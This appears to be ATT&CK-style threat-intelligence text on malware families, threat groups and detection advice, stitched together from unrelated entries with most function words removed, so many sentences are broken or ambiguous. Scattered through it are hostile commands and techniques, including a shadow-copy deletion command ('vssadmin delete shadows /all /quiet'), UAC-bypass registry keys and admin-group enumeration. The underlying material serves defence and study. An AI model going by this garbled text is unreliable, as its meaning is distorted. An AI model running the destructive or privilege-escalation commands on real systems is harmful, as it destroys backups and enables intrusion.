[Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors [BloodHound](https://attack.mitre.org/software/S0521) discover trust domains.(Citation: FoxIT Wocao December 2019) Map trusts existing domains/forests trust relationships minimum. [Clop](https://attack.mitre.org/software/S0611) search processes antivirus antimalware product names.(Citation: Mcafee Clop Aug 2019)(Citation: Cybereason Clop Dec 2020) [More_eggs](https://attack.mitre.org/software/S0284) download launch additional payloads.(Citation: Talos Cobalt July 2018)(Citation: Security Intelligence Eggs Aug 2019) [Empire](https://attack.mitre.org/software/S0363) utilize <code>Invoke-DCOM</code> leverage remote execution lateral movement.(Citation: Github PowerShell Empire) malicious documents files downloaded link executed user's [POWERSTATS](https://attack.mitre.org/software/S0223) DCOM (targeting 127.0.0.1 loopback address) execute additional payloads compromised hosts.(Citation: FireEye MuddyWater Mar 2018) [More_eggs](https://attack.mitre.org/software/S0284) requests check internet connectivity.(Citation: Security Intelligence Eggs Aug 2019) [Lucifer](https://attack.mitre.org/software/S0532) resources cryptocurrency, dropping XMRig Monero.(Citation: Unit 42 Lucifer June 2020) (Citation: Cybereason Molerats Dec 2020)  Monitor changed .manifest/.local redirection files, file systems moving, renaming, replacing, modifying DLLs. set DLLs loaded process (compared behavior) correlate software, patches, etc., suspicious. [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware gathers passwords Windows Credential Vault.(Citation: Citizen Lab Stealth Falcon 2016) [P2P ZeuS](https://attack.mitre.org/software/S0016) junk data outgoing UDP packets peer implants.(Citation: Dell P2P ZeuS) Monitor unexpected windows registry key accessed search compromised systems insecurely stored credentials. Monitor executed commands arguments acquire credentials browsers reading files specific target browser.(Citation: Talos Olympic Destroyer 2018) [DarkVishnya](https://attack.mitre.org/groups/G0105) Bash Bunny, Raspberry Pi, netbooks inexpensive laptops connect company’s local network.(Citation: Securelist DarkVishnya Dec 2018) [Astaroth](https://attack.mitre.org/software/S0373) collects timestamp infected machine. (Citation: Cofense Astaroth Sept 2018) [SPACESHIP](https://attack.mitre.org/software/S0035) copies staged data removable drives inserted system.(Citation: FireEye APT30) module [CozyCar](https://attack.mitre.org/software/S0046) arbitrary commands executed invoking <code>C:\Windows\System32\cmd.exe</code>.(Citation: F-Secure CozyDuke) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [SEASHARPEE](https://attack.mitre.org/software/S0185) download remote files victims.(Citation: FireEye APT34 Webinar Dec 2017) [OutSteel](https://attack.mitre.org/software/S1017) `cmd.exe` scan compromised host specific file extensions.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) multi-factor authentication user privileged accounts. enforcing multi-factor authentication <code>CreateKeyPair</code> <code>ImportKeyPair</code> API calls IAM policies.(Citation: Expel Evil AWS) [APT37](https://attack.mitre.org/groups/G0067)'s persistence Registry key <code>HKCU\Software\Microsoft\CurrentVersion\Run\</code>.(Citation: FireEye APT37 Feb 2018)(Citation: Talos Group123) [Linfo](https://attack.mitre.org/software/S0211) creates backdoor remote attackers retrieve information.(Citation: Symantec Linfo 2012) [Threat Group-1314](https://attack.mitre.org/groups/G0028) actors mapped network drives <code>net use</code>.(Citation: Dell TG-1314) Monitor Access Tokens access services Email created SAML tokens 1202 events domain.(Citation: Sygnia Golden SAML) [Kinsing](https://attack.mitre.org/software/S0599) command search specific files.(Citation: Aqua Kinsing April 2020) [APT41](https://attack.mitre.org/groups/G0096) compromised credentials log systems.(Citation: FireEye APT41 Aug 2019)(Citation: Crowdstrike GTR2020 Mar 2020) [RainyDay](https://attack.mitre.org/software/S0629) names mimic legitimate software including "vmtoolsd.exe" spoof Vmtools.(Citation: Bitdefender Naikon April 2021) [Flame](https://attack.mitre.org/software/S0143) MS10-061 exploit print spooler vulnerability remote shared printer laterally.(Citation: Kaspersky Flame)(Citation: Kaspersky Flame Functionality) [FatDuke](https://attack.mitre.org/software/S0512) user agent strings default browser <code>HKCU\Software\Classes\http\shell\open\command</code>.(Citation: ESET Dukes October 2019) UAC bypass methods rely modifying specific, user-accessible Registry settings. example:
* <code>eventvwr.exe</code> bypass <code>[HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command</code> Registry key.(Citation: enigma0x3 Fileless UAC Bypass)
* <code>sdclt.exe</code> bypass <code>[HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code> <code>[HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand</code> Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)
Analysts monitor Registry settings unauthorized changes. technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls.  [Empire](https://attack.mitre.org/software/S0363) Inveigh conduct service poisoning credential theft relay attacks.(Citation: Github PowerShell Empire)(Citation: GitHub Inveigh) [BabyShark](https://attack.mitre.org/software/S0414) scheduled tasks maintain persistence.(Citation: Crowdstrike GTR2020 Mar 2020) [HEXANE](https://attack.mitre.org/groups/G1001) `cmdkey` victim machines identify stored credentials.(Citation: Kaspersky Lyceum October 2021) [Astaroth](https://attack.mitre.org/software/S0373) loads module XSL script parameter <code>vShow</code> set zero, application hidden window. (Citation: Cybereason Astaroth Feb 2019) [BlackEnergy](https://attack.mitre.org/software/S0089) attempts bypass default User Access Control (UAC) settings exploiting backward-compatibility setting Windows 7 later.(Citation: F-Secure BlackEnergy 2014) (Citation: FireEye APT39 Jan 2019) [P8RAT](https://attack.mitre.org/software/S0626) ability "sleep" time evade detection.(Citation: Securelist APT10 March 2021) [Koadic](https://attack.mitre.org/software/S0250) OS version build, name, processor architecture compromised host.(Citation: MalwareBytes LazyScripter Feb 2021) [TeamTNT](https://attack.mitre.org/groups/G0139) created services execute cryptocurrency mining software.(Citation: Cisco Talos Intelligence Group) [EnvyScout](https://attack.mitre.org/software/S0634) determine ISO payload received Windows iOS device.(Citation: MSTIC Nobelium Toolset 2021) disabling DCOM Dcomcnfg.exe.(Citation: Disable DCOM) [Group5](https://attack.mitre.org/groups/G0043) C2 servers communicated malware TCP 8081, 8282, 8083.(Citation: Citizen Lab Group5) Monitor executed commands arguments detect token manipulation auditing command-line activity. Specifically, analysts runas command. Detailed command-line logging enabled default Windows.(Citation: Command-line Logging) [Clop](https://attack.mitre.org/software/S0611) kill processes services backups security solutions.(Citation: Unit42 Clop April 2021)(Citation: Mcafee Clop Aug 2019)  [APT39](https://attack.mitre.org/groups/G0087) maintained persistence startup folder.(Citation: FireEye APT39 Jan 2019) [LiteDuke](https://attack.mitre.org/software/S0513) ability decrypt decode multiple layers obfuscation.(Citation: ESET Dukes October 2019) [WarzoneRAT](https://attack.mitre.org/software/S0670) list processes compromised host.(Citation: Check Warzone Feb 2020) [PLATINUM](https://attack.mitre.org/groups/G0068) drive-by attacks vulnerable browser plugins.(Citation: PLATINUM April 2016) (Citation: F-Secure Dukes)(Citation: Secureworks IRON HEMLOCK Profile) [CharmPower](https://attack.mitre.org/software/S0674) enumerate OS version targeted system.(Citation: Check APT35 CharmPower January 2022) [FELIXROOT](https://attack.mitre.org/software/S0267) collects list running processes.(Citation: ESET GreyEnergy Oct 2018) (Citation: Cybereason Soft Cell June 2019) [Ragnar Locker](https://attack.mitre.org/software/S0481) encrypts files local machine mapped drives prior displaying note demanding ransom.(Citation: Sophos Ragnar 2020)(Citation: Cynet Ragnar Apr 2020) [Cuba](https://attack.mitre.org/software/S0625) enumerate local drives, disk type, disk space.(Citation: McAfee Cuba April 2021) Monitor unusual kernel driver installation activity wipe corrupt raw disk data specific systems network interrupt availability network resources. [Turla](https://attack.mitre.org/groups/G0010) <code>net localgroup</code> <code>net localgroup Administrators</code> enumerate information, including local administrators group.(Citation: ESET ComRAT 2020) [FIN10](https://attack.mitre.org/groups/G0051) batch scripts scheduled tasks delete critical files.(Citation: FireEye FIN10 June 2017) [Ebury](https://attack.mitre.org/software/S0377) user mode rootkit techniques remain hidden system.(Citation: ESET Ebury Oct 2017) administrator accounts permissions add IIS components day-to-day operations expose permissions potential adversaries unprivileged systems. host-based security software block LLMNR/NetBIOS traffic. Enabling SMB Signing NTLMv2 relay attacks.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)(Citation: SMB Packet Signing) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors executed PowerView ShareFinder module identify shares.(Citation: DFIR Conti Bazar Nov 2021) Monitor creation access tokens SAML tokens 4769 1200 events domain.(Citation: Sygnia Golden SAML) [QakBot](https://attack.mitre.org/software/S0650) check compromised host presence multiple executables analysis tools halt execution found.(Citation: Trend Micro Qakbot 2020)(Citation: ATT QakBot April 2021) Adversaries rename abusable binaries evade detections, argument <code>INJECTRUNNING</code> required mavinject.exe perform [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001) monitored alert malicious activity. [WellMail](https://attack.mitre.org/software/S0515) receive data executable scripts C2.(Citation: CISA WellMail July 2020) [Winnti Group](https://attack.mitre.org/groups/G0044) rootkit modify typical server functionality.(Citation: Kaspersky Winnti April 2013) [Chinoxy](https://attack.mitre.org/software/S1041) digitally signed binary ("Logitech Bluetooth Wizard Host Process") load dll memory.(Citation: Bitdefender FunnyDream Campaign November 2020) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) exfiltrated files stolen local systems.(Citation: Secureworks BRONZE BUTLER Oct 2017) [XCSSET](https://attack.mitre.org/software/S0658) hidden folder named <code>.xcassets</code> <code>.git</code> embed Xcode.(Citation: trendmicro xcsset xcode project 2020) [MURKYTOP](https://attack.mitre.org/software/S0233) capability identify remote hosts connected networks.(Citation: FireEye Periscope March 2018) [ECCENTRICBANDWAGON](https://attack.mitre.org/software/S0593) delete log files generated malware stored <code>C:\windows\temp\tmp0207</code>.(Citation: CISA EB Aug 2020) [APT28](https://attack.mitre.org/groups/G0007) harvested user's login credentials.(Citation: Targeting Elections September 2020) [HAFNIUM](https://attack.mitre.org/groups/G0125) downloaded malware tools--including Nishang PowerCat--onto compromised host.(Citation: HAFNIUM March 2020)  Monitor newly executed processes disable services render services unavailable legitimate users. [Lokibot](https://attack.mitre.org/software/S0447) delivered malicious XLS attachment contained spearhpishing email.(Citation: Talos Lokibot Jan 2021)  [NETWIRE](https://attack.mitre.org/software/S0198) implement proxies pivot traffic.(Citation: Red Canary NETWIRE January 2020) [Okrum](https://attack.mitre.org/software/S0439) modified Quarks PwDump perform credential dumping.(Citation: ESET Okrum July 2019) [FIN8](https://attack.mitre.org/groups/G0061) valid accounts persistence lateral movement.(Citation: FireEye Enemy FIN8 Aug 2016) [BackConfig](https://attack.mitre.org/software/S0475) VBS install downloader component malicious documents VBA macro code.(Citation: Unit 42 BackConfig 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) targeted victims spearphishing emails malicious Word documents.(Citation: McAfee Bankshot)(Citation: Kaspersky ThreatNeedle Feb 2021)(Citation: McAfee Lazarus Jul 2020)(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus) [Stuxnet](https://attack.mitre.org/software/S0603) collects including domain names, OS version, S7P paths.(Citation: Symantec W.32 Stuxnet Dossier)  [Agent Tesla](https://attack.mitre.org/software/S0331) ability perform anti-sandboxing anti-virtualization checks.(Citation: Malwarebytes Agent Tesla April 2020) [Amadey](https://attack.mitre.org/software/S1025) searched folders antivirus software.(Citation: Korean FSI TA505 2020) [HEXANE](https://attack.mitre.org/groups/G1001) Base64-encoded scripts.(Citation: Kaspersky Lyceum October 2021) Audit domain local accounts permission levels routinely situations adversary gain wide access obtaining credentials privileged account.(Citation: TechNet Credential Theft)(Citation: TechNet Privilege) audits include default accounts enabled, local accounts created authorized. Follow practices design administration enterprise network limit privileged account administrative tiers.(Citation: Securing Privileged Access) [Derusbi](https://attack.mitre.org/software/S0021) capable logging keystrokes.(Citation: FireEye Periscope March 2018) Review <code>cron</code> schedule. <code>cron</code> execution reviewed <code>/var/log</code> directory. validate location <code>cron</code> log file, check syslog config <code>/etc/rsyslog.conf</code> <code>/etc/syslog.conf</code>  [Epic](https://attack.mitre.org/software/S0091) HTTPS C2 communications.(Citation: Kaspersky Turla)(Citation: Kaspersky Turla Aug 2014) [Mongall](https://attack.mitre.org/software/S1026) C2 communication.(Citation: SentinelOne Aoqin Dragon June 2022) [Equation](https://attack.mitre.org/groups/G0020) tools functionality search specific attached hard drive identify overwrite firmware.(Citation: Kaspersky Equation QA) [Kimsuky](https://attack.mitre.org/groups/G0094) developed unique malware MailFetch.py operations.(Citation: KISA Operation Muzabi)(Citation: Talos Kimsuky Nov 2021) [ShimRatReporter](https://attack.mitre.org/software/S0445) generated reports C2 POST requests.(Citation: FOX-IT 2016 Mofang) [OopsIE](https://attack.mitre.org/software/S0264) stages output command execution collected files specific folders exfiltration.(Citation: Unit 42 OopsIE! Feb 2018) [Diavol](https://attack.mitre.org/software/S0659) delete files targeted system.(Citation: Fortinet Diavol July 2021) [SamSam](https://attack.mitre.org/software/S0370) deleting files payloads analysis attack difficult.(Citation: Sophos SamSam Apr 2018) [Heyoka Backdoor](https://attack.mitre.org/software/S1027) inject DLL rundll32.exe execution.(Citation: SentinelOne Aoqin Dragon June 2022) Monitor malicious usage calls, ptrace mmap, attach to, manipulate memory, redirect processes' execution path. Monitoring Linux specific calls ptrace generate amounts data specialized nature, effective method detect common process injection methods.(Citation: ArtOfMemoryForensics)(Citation: GNU Acct)(Citation: RHEL auditd)(Citation: Chokepoint preload rootkits) [SUNBURST](https://attack.mitre.org/software/S0559) remained dormant initial access period weeks.(Citation: FireEye SUNBURST Backdoor December 2020) [T9000](https://attack.mitre.org/software/S0098) gathers beacons MAC IP addresses installation.(Citation: Palo Alto T9000 Feb 2016) [APT38](https://attack.mitre.org/groups/G0082) identified primary users, logged users, sets users commonly system, inactive users.(Citation: CISA AA20-239A BeagleBoyz August 2020) [Rocke](https://attack.mitre.org/groups/G0106) exploited Apache Struts, Oracle WebLogic (CVE-2017-10271), Adobe ColdFusion (CVE-2017-3066) vulnerabilities deliver malware.(Citation: Talos Rocke August 2018)(Citation: Unit 42 Rocke January 2019) Monitor newly executed processes attempt running processes system. [AuTo Stealer](https://attack.mitre.org/software/S1029) store collected data infected host file named `Hostname_UserName.txt` prior exfiltration.(Citation: MalwareBytes SideCopy Dec 2021) [Ruler](https://attack.mitre.org/software/S0358) automate abuse Outlook Rules establish persistence.(Citation: SensePost Ruler GitHub)  [Proxysvc](https://attack.mitre.org/software/S0238) searches local gathers data.(Citation: McAfee GhostSecret) [NBTscan](https://attack.mitre.org/software/S0590) list active users system.(Citation: Debian nbtscan Nov 2019)(Citation: SecTools nbtscan June 2003)	 application whitelisting configured block execution mshta.exe required network prevent potential misuse adversaries. (Citation: Tarrask scheduled task)  (Citation: F-Secure Dukes)(Citation: 365 Defender Solorigate)(Citation: CrowdStrike StellarParticle January 2022) [PlugX](https://attack.mitre.org/software/S0013) module create, delete, modify Registry keys.(Citation: CIRCL PlugX March 2013) [Bisonal](https://attack.mitre.org/software/S0268) Windows API communicate Service Control Manager execute thread.(Citation: Talos Bisonal Mar 2020) [Orz](https://attack.mitre.org/software/S0229) execute commands.(Citation: Proofpoint Leviathan Oct 2017) [Orz](https://attack.mitre.org/software/S0229) execute commands JavaScript.(Citation: Proofpoint Leviathan Oct 2017) [P.A.S. Webshell](https://attack.mitre.org/software/S0598) decryption mechanism process user supplied password execution.(Citation: ANSSI Sandworm January 2021) Minimize services necessary. [UNC2452](https://attack.mitre.org/groups/G0118) compromised credentials remote access laterally.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: MSTIC NOBELIUM Mar 2021) [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors employed nmap pscan scan target environments.(Citation: BlackBerry CostaRicto November 2020)  [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) TROJ_GETVERSION discover services.(Citation: Trend Micro Tick November 2019) [TeamTNT](https://attack.mitre.org/groups/G0139) replaced .dockerd .dockerenv scripts cryptocurrency mining software.(Citation: Cisco Talos Intelligence Group) possible, store separate cryptographic hardware local system.  [AppleSeed](https://attack.mitre.org/software/S0622) ability JavaScript execute PowerShell.(Citation: Malwarebytes Kimsuky June 2021) [BackConfig](https://attack.mitre.org/software/S0475) download batch files execute commands compromised host.(Citation: Unit 42 BackConfig 2020) [Windigo](https://attack.mitre.org/groups/G0124) script detect Linux distribution version installed system.(Citation: ESET ForSSHe December 2018) [menuPass](https://attack.mitre.org/groups/G0045) [esentutl](https://attack.mitre.org/software/S0404) change file extensions true type masquerading .txt files.(Citation: FireEye APT10 Sept 2018)  [GRIFFON](https://attack.mitre.org/software/S0417) screenshot module screenshot remote system.(Citation: SecureList Griffon 2019) [Lucifer](https://attack.mitre.org/software/S0532) collect IP address compromised host.(Citation: Unit 42 Lucifer June 2020) [BlackTech](https://attack.mitre.org/groups/G0098) stolen code-signing certificates malicious payloads.(Citation: Symantec Palmerworm Sep 2020) [Ragnar Locker](https://attack.mitre.org/software/S0481) delete volume shadow copies <code>vssadmin delete shadows /all /quiet</code>.(Citation: Sophos Ragnar 2020) [Agent Tesla](https://attack.mitre.org/software/S0331) steal data victim’s clipboard.(Citation: Talos Agent Tesla Oct 2018)(Citation: Fortinet Agent Tesla April 2018)(Citation: Fortinet Agent Tesla June 2017)(Citation: Bitdefender Agent Tesla April 2020) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) PowerShell reverse TCP shells issue interactive commands network connection.(Citation: RedCanary Mockingbird 2020) [PowerLess](https://attack.mitre.org/software/S1012) module log keystrokes.(Citation: Cybereason PowerLess February 2022) Monitor newly constructed logon behavior Microsoft's SharePoint configured report access documents. (Citation: SharePoint Logging) Sharepoint audit logging configured report user shares resource. (Citation: Sharepoint Sharing Events)The user access logging Atlassian's Confluence configured report access documents AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage analysis infrastructure required robust detection capabilities. [Xbash](https://attack.mitre.org/software/S0341) C2 communications.(Citation: Unit42 Xbash Sept 2018) [NETWIRE](https://attack.mitre.org/software/S0198) creates Registry start-up entry establish persistence.(Citation: McAfee Netwire Mar 2015)(Citation: Red Canary NETWIRE January 2020)(Citation: Unit 42 NETWIRE April 2020)(Citation: Proofpoint NETWIRE December 2020) [NDiskMonitor](https://attack.mitre.org/software/S0272) obtains victim username encrypts send C2 channel.(Citation: TrendMicro Patchwork Dec 2017) Limit privileges user accounts authorized administrators interact system-level process service configurations. [Ryuk](https://attack.mitre.org/software/S0446) anti-disassembly code transformation obfuscation techniques.(Citation: CrowdStrike Wizard Spider October 2020) primary delivered mechaism [Agent Tesla](https://attack.mitre.org/software/S0331) email phishing messages.(Citation: Bitdefender Agent Tesla April 2020)  [KONNI](https://attack.mitre.org/software/S0356) certutil download decode base64 encoded strings devoted custom performing components deobfuscation process.(Citation: Medium KONNI Jan 2020)(Citation: Malwarebytes Konni Aug 2021) [DCSrv](https://attack.mitre.org/software/S1033) masqueraded service legitimate svchost.exe process.(Citation: Checkpoint MosesStaff Nov 2021) [SQLRat](https://attack.mitre.org/software/S0390) observed deleting scripts used.(Citation: Flashpoint FIN 7 March 2019)	 [Ramsay](https://attack.mitre.org/software/S0458) delivered OLE objects malicious documents.(Citation: Eset Ramsay 2020)	 [ABK](https://attack.mitre.org/software/S0469) ability identify installed anti-virus product compromised host.(Citation: Trend Micro Tick November 2019) [IceApple](https://attack.mitre.org/software/S1022) [ifconfig](https://attack.mitre.org/software/S0101) module iterate network interfaces host retrieve name, description, MAC address, DNS suffix, DNS servers, gateways, IPv4 addresses, subnet masks.(Citation: CrowdStrike IceApple 2022) Monitor drive letters mount data storage devices unexpected modifications rootkits hide presence programs, files, network connections, services, drivers, components. [Cobalt Strike](https://attack.mitre.org/software/S0154) Profiler JavaScript perform reconnaissance actions.(Citation: Talos Cobalt Strike September 2020) [PLAINTEE](https://attack.mitre.org/software/S0254) collects enumeration data infected machine checks OS version.(Citation: Rancor Unit42 June 2018) [ShadowPad](https://attack.mitre.org/software/S0596) maintains configuration block virtual file Registry.(Citation: Kaspersky ShadowPad Aug 2017)(Citation: TrendMicro EarthLusca 2022) [SUPERNOVA](https://attack.mitre.org/software/S0578) receive request specific set parameters execute.(Citation: Guidepoint SUPERNOVA Dec 2020)(Citation: Unit42 SUPERNOVA Dec 2020) Enforce valid digital signatures signed code applications trust applications signatures trusted parties. [JHUHUGIT](https://attack.mitre.org/software/S0044) variant takes screenshots simulating user pressing "Take Screenshot" key (VK_SCREENSHOT), accessing screenshot saved clipboard, converting JPG image.(Citation: Unit 42 Playbook Dec 2017)(Citation: Talos Seduploader Oct 2017) [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) command execution module perform target enumeration.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) [APT39](https://attack.mitre.org/groups/G0087) tools proxy C2 communications.(Citation: BitDefender Chafer 2020) [FIN4](https://attack.mitre.org/groups/G0085) legitimate credentials hijack email communications.(Citation: FireEye Hacking FIN4 Dec 2014)(Citation: FireEye Hacking FIN4 Video Dec 2014) [menuPass](https://attack.mitre.org/groups/G0045) macro deletes files decoded decompressed them.(Citation: Accenture Hogfish April 2018)(Citation: District Court NY APT10 Indictment December 2018) [APT32](https://attack.mitre.org/groups/G0050) pass hash lateral movement.(Citation: Cybereason Cobalt Kitty 2017) (Citation: Unit 42 ProjectM March 2016) [Turla](https://attack.mitre.org/groups/G0010) custom decryption routine, pulls key salt values artifacts WMI filter [PowerShell Profile](https://attack.mitre.org/techniques/T1546/013), decode encrypted PowerShell payloads.(Citation: ESET Turla PowerShell 2019) [Machete](https://attack.mitre.org/software/S0409)’s downloaded data decrypted AES.(Citation: ESET Machete July 2019) cloud environments, ensure users granted permissions create modify traffic mirrors explicitly required. variants [ADVSTORESHELL](https://attack.mitre.org/software/S0045) achieve persistence registering payload Icon Overlay handler object.(Citation: ESET Sednit 2) [SUNBURST](https://attack.mitre.org/software/S0559) attempted disable software security services checks FNV-1a + XOR hashed hardcoded blocklist.(Citation: FireEye SUNBURST Additional Details Dec 2020) [Cyclops Blink](https://attack.mitre.org/software/S0687) encrypt C2 messages AES-256-CBC TLS. OpenSSL library functions encrypt message randomly generated key IV, encrypted hard-coded RSA public key.(Citation: NCSC Cyclops Blink February 2022) [Ebury](https://attack.mitre.org/software/S0377) list directory entries.(Citation: ESET Ebury Oct 2017)  [PlugX](https://attack.mitre.org/software/S0013) module enumerate drives files recursively.(Citation: CIRCL PlugX March 2013)(Citation: Proofpoint TA416 Europe March 2022) [BLUELIGHT](https://attack.mitre.org/software/S0657) collect IP victim’s machine.(Citation: Volexity InkySquid BLUELIGHT August 2021) [Netwalker](https://attack.mitre.org/software/S0457) add registry entry: <code>HKEY_CURRENT_USER\SOFTWARE\{8 random characters}</code>.(Citation: TrendMicro Netwalker 2020) [njRAT](https://attack.mitre.org/software/S0385) module steals passwords saved victim browsers.(Citation: Fidelis njRAT June 2013)(Citation: Trend Micro njRAT 2018)(Citation: Citizen Lab Group5) [Anchor](https://attack.mitre.org/software/S0504) ICMP C2 communications.(Citation: Cyberreason Anchor December 2019) [InvisiMole](https://attack.mitre.org/software/S0260) collect jpeg files connected MTP devices.(Citation: ESET InvisiMole June 2020) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). (Citation: Unit42 RDAT July 2020) (Citation: Mandiant UNC3890 Aug 2022) [Magic Hound](https://attack.mitre.org/groups/G0059) gathered credentials victims attempted validate 75 websites.(Citation: IBM ITG18 2020) [RedLeaves](https://attack.mitre.org/software/S0153) attempts add shortcut file Startup folder achieve persistence.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: Accenture Hogfish April 2018) [Clambling](https://attack.mitre.org/software/S0660) record screen content AVI format.(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020) [FlawedAmmyy](https://attack.mitre.org/software/S0381) `cmd` execute commands compromised host.(Citation: Korean FSI TA505 2020) [HAFNIUM](https://attack.mitre.org/groups/G0125) acquired services C2 exfiltration.(Citation: HAFNIUM March 2020) Monitor property Policy: <code>Computer Configuration\Windows Settings\Security Settings\Account Policies\Password Policy\Store passwords reversible encryption</code>. default, property set Disabled. [OilRig](https://attack.mitre.org/groups/G0049) custom DNS Tunneling protocols C2.(Citation: Unit 42 Playbook Dec 2017) [Attor](https://attack.mitre.org/software/S0438) encrypts collected data custom implementation Blowfish RSA ciphers.(Citation: ESET Attor Oct 2019) [Cobalt Group](https://attack.mitre.org/groups/G0080) public sites github.com sendspace.com upload files download victim computers.(Citation: PTSecurity Cobalt Aug 2017)(Citation: PTSecurity Cobalt Dec 2016) group's JavaScript backdoor capable downloading files.(Citation: Morphisec Cobalt Gang Oct 2018) [MuddyWater](https://attack.mitre.org/groups/G0069) Word Template, Normal.dotm, persistence.(Citation: Reaqta MuddyWater November 2017) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors scripts detect security software.(Citation: FoxIT Wocao December 2019) [BOOSTWRITE](https://attack.mitre.org/software/S0415) 32-byte multi-XOR key decode data payload.(Citation: FireEye FIN7 Oct 2019)	 Ensure wired wireless traffic encrypted appropriately. practices authentication protocols, Kerberos, ensure traffic credentials protected SSL/TLS. Monitor execution utilities, chmod, command-line arguments setuid setguid bits set. Ensure permissions disallow services permissions level created interacted user permission level. Command arguments rundll32.exe invocation determining origin purpose DLL loaded. [Lizar](https://attack.mitre.org/software/S0681) migrate loader process.(Citation: BiZone Lizar 2021) [Flame](https://attack.mitre.org/software/S0143) record audio existing hardware recording devices.(Citation: Kaspersky Flame)(Citation: Kaspersky Flame Functionality) [Empire](https://attack.mitre.org/software/S0363) acquire network configuration DNS servers, public IP, network proxies host.(Citation: Github PowerShell Empire)(Citation: Talos Frankenstein June 2019) [Gorgon Group](https://attack.mitre.org/groups/G0078) malware process hollowing inject trojans process.(Citation: Unit 42 Gorgon Aug 2018) Block .scr files executed non-standard locations. Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g. unauthorized, gratuitous, anomalous traffic patterns attempting access configuration content) [Mis-Type](https://attack.mitre.org/software/S0084) Windows API calls, including `NetUserAdd` `NetUserDel`.(Citation: Cylance Dust Storm) [Zebrocy](https://attack.mitre.org/software/S0251) gathers current time zone system.(Citation: ESET Zebrocy Nov 2018)(Citation: CISA Zebrocy Oct 2020) [Metamorfo](https://attack.mitre.org/software/S0455) includes payloads written JavaScript.(Citation: Medium Metamorfo Apr 2020)  [Gazer](https://attack.mitre.org/software/S0168) establish persistence setting “Shell” “explorer.exe, %malware_pathfile%” Registry key <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</code>.(Citation: ESET Gazer Aug 2017) [Donut](https://attack.mitre.org/software/S0695) erase file references payloads in-memory reflectively loaded executed.(Citation: Donut Github) [Heyoka Backdoor](https://attack.mitre.org/software/S1027) ability delete folders files targeted system.(Citation: SentinelOne Aoqin Dragon June 2022) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors [Empire](https://attack.mitre.org/software/S0363) list running processes.(Citation: Talos Frankenstein June 2019) [MechaFlounder](https://attack.mitre.org/software/S0459) downloaded file named lsass.exe, matches legitimate Windows file.(Citation: Unit 42 MechaFlounder March 2019) Monitor binaries service executables occur software updates.  [Agent Tesla](https://attack.mitre.org/software/S0331) capture screenshots victim’s desktop.(Citation: Talos Agent Tesla Oct 2018)(Citation: DigiTrust Agent Tesla Jan 2017)(Citation: Fortinet Agent Tesla April 2018)(Citation: Fortinet Agent Tesla June 2017)(Citation: Bitdefender Agent Tesla April 2020) [Rifdoor](https://attack.mitre.org/software/S0433) encrypted strings single byte XOR algorithm.(Citation: Carbon Black HotCroissant April 2020) [FIN7](https://attack.mitre.org/groups/G0046) signed [Carbanak](https://attack.mitre.org/software/S0030) payloads legally purchased code signing certificates. [FIN7](https://attack.mitre.org/groups/G0046) digitally signed phishing documents, backdoors staging tools bypass security controls.(Citation: FireEye CARBANAK June 2017)(Citation: FireEye FIN7 Aug 2018) [Denis](https://attack.mitre.org/software/S0354) multiple checks, processor register characteristics, evade emulation analysis.(Citation: Cybereason Cobalt Kitty 2017) Monitor newly constructed scheduled jobs abuse task scheduling functionality facilitate initial recurring execution malicious code. [Hydraq](https://attack.mitre.org/software/S0203) creates backdoor remote attackers retrieve information, CPU speed, Registry keys.(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: Symantec Hydraq Jan 2010) [VERMIN](https://attack.mitre.org/software/S0257) gathers local IP address.(Citation: Unit 42 VERMIN Jan 2018) [Metamorfo](https://attack.mitre.org/software/S0455) searched compromised banking applications.(Citation: FireEye Metamorfo Apr 2018)(Citation: ESET Casbaneiro Oct 2019) Firewalls proxies inspect URLs known-bad domains parameters. reputation-based analytics websites requested resources domain is, registered to, bad list, users connected before. [MuddyWater](https://attack.mitre.org/groups/G0069) maintains persistence victim networks side-loading dlls trick legitimate programs running malware.(Citation: DHS CISA AA22-055A MuddyWater February 2022) [DDKONG](https://attack.mitre.org/software/S0255) downloads uploads files victim’s machine.(Citation: Rancor Unit42 June 2018) [Valak](https://attack.mitre.org/software/S0476) ability modify Registry key <code>HKCU\Software\ApplicationContainer\Appsw64</code> store C2 server downloads.(Citation: Cybereason Valak 2020)(Citation: Unit 42 Valak July 2020)(Citation: SentinelOne Valak June 2020) [Sidewinder](https://attack.mitre.org/groups/G0121) exploited vulnerabilities gain execution including CVE-2017-11882 